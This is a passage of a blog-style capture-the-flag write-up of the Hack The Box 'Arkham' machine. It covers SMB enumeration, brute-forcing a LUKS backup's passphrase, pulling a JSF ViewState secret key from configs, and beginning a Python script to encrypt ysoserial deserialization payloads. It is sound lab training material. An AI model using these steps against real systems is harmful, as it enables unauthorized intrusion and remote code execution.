&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-arkham-retired-and-heres-my-write-up-about-it-this-box-was-a-challenging-one-and-i-enjoyed-it-a-lot-it-had-an-interesting-java-deserialization-vulnerability-which-is-the-best-thing-about-this-box-despite-the-fact-that-some-parts-were-annoying-this-box-was-great-its-a-windows-box-and-its-ip-is-101010130-i-added-it-to-etchosts-as-arkhamhtb-lets-jump-right-in-&quot;&gt;Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.130&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;arkham.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC arkham.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/arkham/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-http-on-port-80-8080-and-smb-i-checked-smb-first&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
&lt;h4 id=&quot;lets-use-smbclient-to-list-the-shares-&quot;&gt;Let’s use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient --list //arkham.htb/ -U &quot;&quot;
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        BatShare        Disk      Master Wayne's secrets
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to arkham.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;users-is-an-interesting-share-name-i-checked-it-and-it-had-the-directories-for-guest-and-default-users-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Users&lt;/code&gt; is an interesting share name, I checked it and it had the directories for &lt;code class=&quot;highlighter-rouge&quot;&gt;Guest&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;default&lt;/code&gt; users :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/Users/ -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                  DR        0  Sun Feb  3 15:24:10 2019
  ..                                 DR        0  Sun Feb  3 15:24:10 2019
  Default                           DHR        0  Fri Feb  1 04:49:06 2019
  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
  Guest                               D        0  Sun Feb  3 15:24:19 2019

                5158399 blocks of size 4096. 1899220 blocks available
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-enumerated-it-for-some-time-but-i-couldnt-find-anything-useful-so-i-checked-batshare-which-had-a-zip-archive-called-appserverzip-&quot;&gt;I enumerated it for some time but I couldn’t find anything useful so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;BatShare&lt;/code&gt; which had a &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; archive called &lt;code class=&quot;highlighter-rouge&quot;&gt;appserver.zip&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/BatShare -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Sun Feb  3 15:00:10 2019
  ..                                  D        0  Sun Feb  3 15:00:10 2019
  appserver.zip                       A  4046695  Fri Feb  1 08:13:37 2019

                5158399 blocks of size 4096. 1897320 blocks available
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-downloaded-it-get-appserverzip-then-i-started-to-examine-it&quot;&gt;I downloaded it (&lt;code class=&quot;highlighter-rouge&quot;&gt;get appserver.zip&lt;/code&gt;) then I started to examine it.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;decrypting-the-backup-image-luks-encrypted-image&quot;&gt;Decrypting the Backup Image (LUKS Encrypted Image)&lt;/h3&gt;
&lt;h4 id=&quot;after-unzipping-appserverzip-i-got-2-files-importanttxt-and-backupimg&quot;&gt;After unzipping &lt;code class=&quot;highlighter-rouge&quot;&gt;appserver.zip&lt;/code&gt; I got 2 files, &lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTANT.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.img&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# mkdir appserver
root@kali:~/Desktop/HTB/boxes/arkham# cd appserver/
root@kali:~/Desktop/HTB/boxes/arkham/appserver# mv ../appserver.zip .
root@kali:~/Desktop/HTB/boxes/arkham/appserver# unzip appserver.zip 
Archive:  appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img              
root@kali:~/Desktop/HTB/boxes/arkham/appserver# ls -la
total 17276
drwxr-xr-x 2 root root     4096 Aug  9 01:04 .
drwxr-xr-x 3 root root     4096 Aug  9 01:04 ..
-rw-r--r-- 1 root root  4046695 Aug  9 01:03 appserver.zip
-rw-r--r-- 1 root root 13631488 Dec 25  2018 backup.img
-rw-r--r-- 1 root root      149 Dec 25  2018 IMPORTANT.txt
root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;importanttxt-was-a-note-from-bruce-to-alfred-telling-him-that-this-is-the-backup-image-from-their-linux-server-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTANT.txt&lt;/code&gt; was a note from &lt;code class=&quot;highlighter-rouge&quot;&gt;Bruce&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt; telling him that this is the backup image from their Linux server :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# cat IMPORTANT.txt 
Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;backupimg-was-a-luks-encrypted-image-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Backup.img&lt;/code&gt; was a &lt;code class=&quot;highlighter-rouge&quot;&gt;LUKS&lt;/code&gt; encrypted image :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# file backup.img 
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-attempt-to-open-it-with-cryptsetup-but-of-course-we-will-need-a-password-&quot;&gt;We can attempt to open it with &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup&lt;/code&gt; but of course we will need a password :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# cryptsetup open --type luks backup.img test
Enter passphrase for backup.img:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-use-a-tool-called-bruteforce-luks-to-bruteforce-the-password-but-using-it-with-rockyou-would-take-a-very-long-time-the-box-so-far-has-a-lot-of-batman-references-like-the-names-alfred-bruce-joker--and-the-share-name-batshare-also-the-comment-of-that-share--master-waynes-secrets&quot;&gt;We can use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;bruteforce-luks&lt;/code&gt; to bruteforce the password, but using it with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; would take a very long time. The box so far has a lot of batman references, like the names &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Bruce&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Joker&lt;/code&gt;  and the share name &lt;code class=&quot;highlighter-rouge&quot;&gt;BatShare&lt;/code&gt;, also the comment of that share : &lt;code class=&quot;highlighter-rouge&quot;&gt;Master Wayne's secrets&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-took-all-the-passwords-from-rockyou-that-had-batman-in-them-and-created-a-custom-list-&quot;&gt;I took all the passwords from &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; that had &lt;code class=&quot;highlighter-rouge&quot;&gt;batman&lt;/code&gt; in them and created a custom list :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# grep batman /usr/share/wordlists/rockyou.txt &amp;gt; list.txt
root@kali:~/Desktop/HTB/boxes/arkham/appserver# bruteforce-luks -f ./list.txt ./backup.img 
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 60
Tried passwords per second: 0.361446
Last tried password: batmanforever

Password found: batmanforever
root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-worked-and-the-password-was-batmanforever&quot;&gt;It worked and the password was &lt;code class=&quot;highlighter-rouge&quot;&gt;batmanforever&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/arkham/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-had-a-directory-called-mask-so-i-copied-it-then-i-unmounted-the-image&quot;&gt;It had a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;Mask&lt;/code&gt; so I copied it then I unmounted the image.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# ls -la
total 18
drwxr-xr-x  4 root root  1024 Dec 25  2018 .
drwxr-x---+ 3 root root  4096 Aug  9 01:30 ..
drwx------  2 root root 12288 Dec 25  2018 lost+found
drwxrwxr-x  4 root root  1024 Dec 25  2018 Mask
root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# cd -                             /root/Desktop/HTB/boxes/arkham/appserver
root@kali:~/Desktop/HTB/boxes/arkham/appserver# cp -r /media/root/af474e94-894e-4bb6-897a-adc82884b3d8/Mask/ .
root@kali:~/Desktop/HTB/boxes/arkham/appserver#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;there-were-some-useless-stuff-that-i-didnt-really-care-about-there-was-a-directory-called-tomcat-stuff-which-had-some-web-server-configuration-files-that-one-was-interesting&quot;&gt;There were some useless stuff that I didn’t really care about, there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat-stuff&lt;/code&gt; which had some web server configuration files, that one was interesting.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# ls -la
total 896
drwxr-xr-x 4 root root   4096 Aug  9 01:32 .
drwxr-xr-x 3 root root   4096 Aug  9 01:32 ..
drwxr-xr-x 2 root root   4096 Aug  9 01:32 docs
-rw-r--r-- 1 root root  96978 Aug  9 01:32 joker.png
-rw-r--r-- 1 root root 105374 Aug  9 01:32 me.jpg
-rw-r--r-- 1 root root 687160 Aug  9 01:32 mycar.jpg
-rw-r--r-- 1 root root   7586 Aug  9 01:32 robin.jpeg
drwxr-xr-x 2 root root   4096 Aug  9 01:32 tomcat-stuff
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# cd tomcat-stuff/
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# ls -la
total 212
drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
-rw-r--r-- 1 root root   1368 Aug  9 01:32 context.xml
-rw-r--r-- 1 root root    832 Aug  9 01:32 faces-config.xml
-rw-r--r-- 1 root root   1172 Aug  9 01:32 jaspic-providers.xml
-rw-r--r-- 1 root root     39 Aug  9 01:32 MANIFEST.MF
-rw-r--r-- 1 root root   7678 Aug  9 01:32 server.xml
-rw-r--r-- 1 root root   2208 Aug  9 01:32 tomcat-users.xml
-rw-r--r-- 1 root root 174021 Aug  9 01:32 web.xml
-rw-r--r-- 1 root root   3498 Aug  9 01:32 web.xml.bak
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# cd ../docs
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# ls -la
total 204
drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
-rw-r--r-- 1 root root 199998 Aug  9 01:32 Batman-Begins.pdf
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-have-the-server-configuration-files-however-we-havent-checked-any-of-the-http-ports-yet&quot;&gt;We have the server configuration files, However we haven’t checked any of the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports yet.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h4&gt;
&lt;h4 id=&quot;port-80-had-nothing-running-there-was-only-the-default-iis-index-page-and-no-subdirectories&quot;&gt;Port 80 had nothing running, there was only the default &lt;code class=&quot;highlighter-rouge&quot;&gt;IIS&lt;/code&gt; index page and no subdirectories.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-port-8080-there-was-a-website-with-some-links-&quot;&gt;On port 8080 there was a website with some links :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;one-of-the-links-was-the-subscription-link--httparkhamhtb8080usersubscribefaces&quot;&gt;One of the links was the subscription link : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://arkham.htb:8080/userSubscribe.faces&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tested-it-to-see-what-will-happen-&quot;&gt;I tested it to see what will happen :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/arkham/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-interesting-i-intercepted-the-request-with-burp-and-found-some-interesting-parameters-in-the-post-request-&quot;&gt;Nothing interesting, I intercepted the request with &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; and found some interesting parameters in the POST request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
Host: arkham.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://arkham.htb:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 257
Cookie: JSESSIONID=F018FBFC4605B1C80EB54D5CA2A46B91
Connection: close
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;jsf-viewstate-deserialization-vulnerability&quot;&gt;JSF ViewState Deserialization Vulnerability&lt;/h3&gt;
&lt;h4 id=&quot;the-page-had-faces-extension-and-the-post-request-had-a-parameter-called-javaxfacesviewstate&quot;&gt;The page had &lt;code class=&quot;highlighter-rouge&quot;&gt;.faces&lt;/code&gt; extension and the POST request had a parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;javax.faces.ViewState&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;after-some-research-i-knew-that-this-parameter-holds-a-java-serialized-object-this-means-that-there-is-a-potential-deserialization-vulnerability&quot;&gt;After some research I knew that this parameter holds a java serialized object, this means that there is a potential deserialization vulnerability.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;some-resources-if-you-are-unfamiliar-with-deserialization-vulnerabilities-&quot;&gt;Some resources if you are unfamiliar with deserialization vulnerabilities :&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;misconfigured-jsf-viewstates-can-lead-to-severe-rce-vulnerabilities&quot;&gt;&lt;a href=&quot;https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html&quot;&gt;Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities&lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;exploiting-blind-java-deserialization-with-burp-and-ysoserial&quot;&gt;&lt;a href=&quot;https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/&quot;&gt;Exploiting blind Java deserialization with Burp and Ysoserial&lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;how-i-found-a-1500-worth-deserialization-vulnerability&quot;&gt;&lt;a href=&quot;https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a&quot;&gt;How i found a 1500$ worth Deserialization vulnerability&lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;encrypted-java-serialized-rce-this-helped-me-to-know-how-to-encrypt-the-data&quot;&gt;&lt;a href=&quot;https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d&quot;&gt;Encrypted Java Serialized RCE&lt;/a&gt; (This helped me to know how to encrypt the data)&lt;/h4&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;when-i-tried-to-decode-the-base-64-encoded-value-i-got-nothing-readable&quot;&gt;When I tried to decode the base-64 encoded value I got nothing readable:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-redirected-the-output-into-a-file-and-ran-file-command-against-it-and-i-got-data-instead-of-java-serialization-data&quot;&gt;I redirected the output into a file and ran &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command against it, and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;Java serialization data&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;this-means-that-the-serialized-data-are-encrypted-luckily-we-have-the-server-configuration-files-its-time-to-check-them&quot;&gt;This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.&lt;/h4&gt;
&lt;h4 id=&quot;in-webxmlbak-i-found-the-key-used-to-encrypt-the-data-also-the-mac-algorithm-which-was-hmac-sha1-and-the-used-key&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;web.xml.bak&lt;/code&gt; I found the key used to encrypt the data, also the MAC algorithm which was &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac-sha1&lt;/code&gt; and the used key.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ----------------
     Removed Output
    ----------------
&amp;lt;context-param&amp;gt;     

&amp;lt;param-name&amp;gt;org.apache.myfaces.SECRET&amp;lt;/param-name&amp;gt;                                                                     
&amp;lt;param-value&amp;gt;SnNGOTg3Ni0=&amp;lt;/param-value&amp;gt;                                                                                
&amp;lt;/context-param&amp;gt;                                                                                                       
    &amp;lt;context-param&amp;gt;                                                                                                    
        &amp;lt;param-name&amp;gt;org.apache.myfaces.MAC_ALGORITHM&amp;lt;/param-name&amp;gt;                                                      
        &amp;lt;param-value&amp;gt;HmacSHA1&amp;lt;/param-value&amp;gt;                                                                            
     &amp;lt;/context-param&amp;gt;
&amp;lt;context-param&amp;gt;
&amp;lt;param-name&amp;gt;org.apache.myfaces.MAC_SECRET&amp;lt;/param-name&amp;gt;
&amp;lt;param-value&amp;gt;SnNGOTg3Ni0=&amp;lt;/param-value&amp;gt;
&amp;lt;/context-param&amp;gt;
&amp;lt;context-param&amp;gt;
    ----------------
     Removed Output
    ----------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-same-key-was-used--snngotg3ni0-its-base-64-encoded-so-we-need-to-decode-it-&quot;&gt;The same key was used : &lt;code class=&quot;highlighter-rouge&quot;&gt;SnNGOTg3Ni0=&lt;/code&gt;, it’s base-64 encoded so we need to decode it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# echo SnNGOTg3Ni0= | base64 -d
JsF9876-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-key-is-jsf9876-&quot;&gt;The key is &lt;code class=&quot;highlighter-rouge&quot;&gt;JsF9876-&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;we-have-everything-we-need-to-encrypt-the-data-correctly-i-wrote-a-python-script-to-do-it&quot;&gt;We have everything we need to encrypt the data correctly, I wrote a python script to do it.&lt;/h4&gt;
&lt;h4 id=&quot;basically-im-going-to-create-the-payload-with-ysoserial-then-use-my-script-to-encrypt-it&quot;&gt;Basically I’m going to create the payload with &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt;&lt;/a&gt; then use my script to encrypt it.&lt;/h4&gt;
&lt;h4 id=&quot;viewstatepy-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;viewstate.py&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hmac&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pyDes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
